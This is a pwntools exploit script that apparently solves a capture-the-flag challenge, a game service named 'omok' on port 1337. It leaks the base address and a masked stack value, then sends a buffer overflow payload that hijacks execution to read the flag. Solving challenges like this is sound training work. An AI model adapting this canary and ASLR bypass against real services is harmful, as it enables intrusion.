from pwn import *
import time

r=remote("",1337)

print r.recvuntil(">")

#############change GS#################################################

r.sendline("1")    			#choose do omok

print r.recvuntil(">")

r.sendline(" "+"a"*22+"w"*141+" ") 	#change GS

#time.sleep(1)
print r.recvuntil("4. exit")
#r.recvall()
#time.sleep(1)
print r.recvuntil(">")

#################get base addr############################################

r.sendline("3")				#get base address
print r.recvuntil(">")
r.sendline("5")
print r.recvuntil("send comment to ")
r.recv(8)
#print "aefjaiej"+r.recv(3)
baseaddr=u32(r.recv(4))-0x10db
print "base address is : "+hex(baseaddr)
r.recvuntil(">")
r.sendline("ssgskid")
print r.recvuntil(">")

#####################do exploit###########################################

r.sendline("3")				#exploit
print r.recvuntil(">")
r.sendline("4")
print r.recvuntil("send comment to ")
xored = u32(r.recv(4))
print "ebp address that came from xored canary is : "+hex(xored^0x61616161)
ebp=(xored^0x61616161)+0x30			#get ex function ebp address
r.recvuntil(">")
r.sendline("a"*32+p32(ebp^0x61616161)+"a"*8+p32(baseaddr+0xE90)+"aaaa"+p32(ebp+16)+"flag"+"\x00")
time.sleep(2)
print r.recv()
